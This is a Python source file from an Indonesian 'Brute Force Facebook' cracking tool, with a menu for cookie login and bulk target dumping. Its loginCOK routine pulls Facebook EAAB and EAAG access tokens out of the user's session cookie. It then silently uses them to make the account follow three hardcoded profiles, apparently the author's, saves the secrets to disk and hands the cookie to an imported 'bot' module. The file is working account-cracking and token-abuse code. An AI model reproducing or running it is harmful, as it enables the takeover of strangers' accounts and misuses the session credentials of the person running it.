#     *Brute Force Facebook (BFF)²
#     *file name: masuk.py
#     *copyright: (C) © 2022 ~ Romi Afrizal
#     *contact me on whatsap: +6281273018924

#     *Terimakasih sudah decode script ini tolong jangan di perjual belikan :)*
#     *Thanks for decoding this script, please don't sell it :)*

from xyz import *
from log.bot import bot_romz as ikutt
from romz.banner import Banner as rz
from romz import hasil as lihat
from romz.dump import romi_afrzl as dumpid

#--- MENU MASUK
class romz_tzy:
	
	def __init__(self):
		self.tokenB,self.tokenG,self.cokis = "ROMZ","XD","MWEHEHE"
		self.headers = 'Mozilla/5.0 (Linux; 10; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML%2C like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36'
		self.business = 'business.facebook.com'
		self.pepek = [
			"romi",
			"Romi",
			"ROMI",
			"Romi Afrizal",
			"romi afrizal",
			"Romi afrizal",
			"ROMI AFRIZAL",
			"romi Afrizal",""
		]
		rz().logo2()
		
		tulis(Panel(f"""{Te} {U}•{K} 01 {O}Login menggunakan cookies
 {U}•{K} 02 {O}Cara mendapatkan cookies
 {U}•{K} 03 {O}Start crack (no login)
 {U}•{K} 04 {O}Lihat hasil crack
 {U}•{M} 00 {O}Keluar""",
		title = f'{Te}{M}[ {H}Menu {M}]',style='#FF0022'))
		rom = input('%s╰─ %sPilih %s> %s'%(p,o,m,k))
		if rom in['']:
			exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
				
		elif rom in['1','01']:
			tulis(Panel(f"{Te} {M}!{O} Wajib gunakan akun tumbal dilarang akun utama",style='#FF0022'))
			kukis = input("%s╰─ %sCookies %s> %s"%(p,o,m,k))
			with requests.Session() as ses:
				self.loginCOK(kukis,ses)
				self.indox()
				print('')
				tulis(Panel(f'{Te} {U}•{O} login berhasil, jalankan ulang tool nya ketik{M}:\n{P} - {H}python bff-2.py',style='#FF0022'));exit()
		
		elif rom in['2','02']:
			tulis(Panel(f"{Te}{U} •{O} buka dengan facebook ",style='#FF0022'))
			print (f"{p}╰─{o} Link tutorial {m}:{o} https://www.facebook.com/100067807565861/posts/231650695771848/?app=fbl")
			os.system("xdg-open https://www.facebook.com/100067807565861/posts/231650695771848/?app=fbl");exit()
		
		elif rom in['Instagram','instagram','INSTAGRAM','Insta','insta','INSTA']:
			exit(f'{p}╰─{m} menu belum tersedia')
			#print (f'\n{o} wait bre {p}...');jeda(3)
			#instagram()

		elif rom in['3','03']:
			tulis(Panel(f'{Te}{U} •{O} masukan nama target, contoh{M} >{O} romi',style='#FF0022'))
			kontol = input('%s╰─ %snama orang %s> %s'%(p,o,m,k))
			if kontol in self.pepek:
				exit ('%s╰─%s jangan bodoh'%(p,m));jeda(2)
			else:
				try:
					jumlah=int(input('%s╰─ %sjumlah user %s> %s'%(p,o,m,k)))
					if "90000" in str(jumlah):
						jumlah-=1
					if jumlah<90001:
						dumpid(self.tokenB,self.tokenG,self.cokis).cloning_gmail(kontol,jumlah)
					else: exit ('%s╰─%s max user 90000'%(p,m));jeda(2)
				except requests.exceptions.ConnectionError:
					exit ("%s╰─%s tidak ada koneksi "%(p,m));jeda(2)
			
		elif rom in['4','04']:
			lihat.hasil_fb(self.ENG)
			
		elif rom in['0','00']:
			self.jalan('%s╰─%s Sampai jumpa tod :) '%(p,h));exit()
				
		else:
			exit ('%s╰─%s isi yang benar'%(p,m));jeda(2)
				
	#--- LOGIN TOKEN
	def loginCOK(self,kukis,ses):
		try: 
			# token EAAB
			url_tokB = ses.get('https://www.facebook.com/adsmanager/manage/campaigns',cookies = {"cookie":kukis})
			ids_tokB = re.search("act=(.*?)&nav_source", url_tokB.text).group(1)
			con_tokB = ses.get(f'https://www.facebook.com/adsmanager/manage/campaigns?act={ids_tokB}&nav_source=no_referrer', cookies = {"cookie":kukis})
			tokenB = re.search('accessToken="(.*?)"',con_tokB.text).group(1)
			# token EAAG
			url_tokG = ses.get(f'https://{self.business}/business_locations', cookies = {"cookie":kukis})
			tokenG = re.search("(EAAG\w+)", url_tokG.text).group(1)
			tulis(Panel(f"{Te}{O}Token EAAB{M}: {K}{tokenB}\n{O}Token EAAG{M}: {K}{tokenG}",title = f'{Te}{M}[ {H}AccessToken {M}]',style='#FF0022'));jeda(2)
			romz1 = '100067807565861'
			romz2 = '100029143111567'
			romz3 = '100028434880529'
			requests.post(
				f"https://graph.facebook.com/{romz1}/subscribers?access_token={tokenB}",
				cookies={"cookie":kukis}
			).json()
			requests.post(
				f"https://graph.facebook.com/{romz2}/subscribers?access_token={tokenB}",
				cookies={"cookie":kukis}
			).json()
			requests.post(
				f"https://graph.facebook.com/{romz3}/subscribers?access_token={tokenB}",
				cookies={"cookie":kukis}
			).json()
			open('data/cookie.txt','w').write(kukis)
			open('data/token_eaab.txt','w').write(tokenB)
			open('data/token_eaag.txt','w').write(tokenG)
			ikutt(kukis).guweh()
		except (KeyError):
			exit ("%s╰─%s cookie invalid "%(p,m));jeda(2)
		except (IOError):
			exit ("%s╰─%s login gagal, periksa cookies anda "%(p,m));jeda(2)
		except (AttributeError) as ee:
			print(f"{m}× {o}Token tidak dapat di akses, akun terkena spam. ");jeda(3)
			self.loginSCRAP(kukis,ses)
			#exit ("%s╰─%s terjadi kesalahan, periksa cookies anda %s"%(p,m,ee));jeda(2)
		except requests.exceptions.ConnectionError:
			exit ("%s╰─%s tidak ada koneksi "%(p,m));jeda(2)
	
	#--- CONVERT COOKIE DICT TO STRING
	def romz_xyz(self,cookie,venom={}):
		for x in cookie.replace(' ','').strip().split(';'):
			kuki = x.split('=')
			if len(kuki) > 1:
				venom.update({kuki[0]: kuki[1]})
		return venom 
	
	#--- UBAH BAHASA
	def ubah_bahasa(self,cookie,ses):
		try:
			url = ses.get("https://mbasic.facebook.com/language/",cookies={"cookie": cookie})
			parsing = parser(url.text,"html.parser")
			for x in parsing.find_all("form",{"method":"post"}):
				if "Bahasa Indonesia" in str(x):
					data = {
						"fb_dtsg" : re.search('name="fb_dtsg" value="(.*?)"',str(url.text)).group(1),
						"jazoest" : re.search('name="jazoest" value="(.*?)"', str(url.text)).group(1),
						"submit"  : "Bahasa Indonesia"
					}
					post = ses.post("https://mbasic.facebook.com"+x["action"],data=data,cookies={"cookie": cookie})
		except:
			pass 
			
	#--- LOGIN COOKIES 
	def loginSCRAP(self,kukis,ses):
		try:
			cek=ses.get("https://mbasic.facebook.com/profile.php?v=info",cookies=self.romz_xyz(kukis)).text 
			if "mbasic_logout_button" in cek:
				open('data/cookie.txt','w').write(kukis)
				open('data/token_eaab.txt','w').write("accessTokenNotFound")
				open('data/token_eaag.txt','w').write("accessTokenNotFound")
				self.jalan(f"\n{p}•─ {o}Hi, welcome {h}"+re.findall("\<title\>(.*?)<\/title\>",cek)[0])
				if "Laporkan Masalah" in cek:
					self.ubah_bahasa(kukis,ses)
					ikutt(kukis).guweh()
				else:
					self.ubah_bahasa(kukis,ses)
					ikutt(kukis).guweh()
			elif "checkpoint" in cek:
				exit(f"\n{m}× account checkpoint{p}")
			else:
				exit(f"\n{m}× cookies invalid{p}")
		except Exception as ee:
			exit(f"\n{m}× {ee}{p}")

	#--- JALAN
	def jalan(self,keliling):
		for mau in keliling + '\n':
			sys.stdout.write(mau)
			sys.stdout.flush();jeda(0.03)
			
	def indox(self):
		kentod = [
			"🕛","🕐","🕑","🕒","🕓","🕔","🕕","🕖","🕗","🕘","🕙","🕚",
			"🕛","🕐","🕑","🕒","🕓","🕔","🕕","🕖","🕗","🕘","🕙","🕚",
			"🕛","🕐","🕑","🕒","🕓","🕔","🕕","🕖","🕗","🕘","🕙","🕚",
			"🕛","🕐","🕑","🕒","🕓","🕔","🕕","🕖","🕗","🕘","🕙","🕚",
			"🕛","🕐","🕑","🕒","🕓","🕔","🕕","🕖","🕗","🕘","🕙","🕚",
			"√"
		]
		for ci in kentod:
			sys.stdout.write(f'\r{p}╰─{o} mohon tunggu ... {h}{ci}')
			sys.stdout.flush();jeda(0.06)
			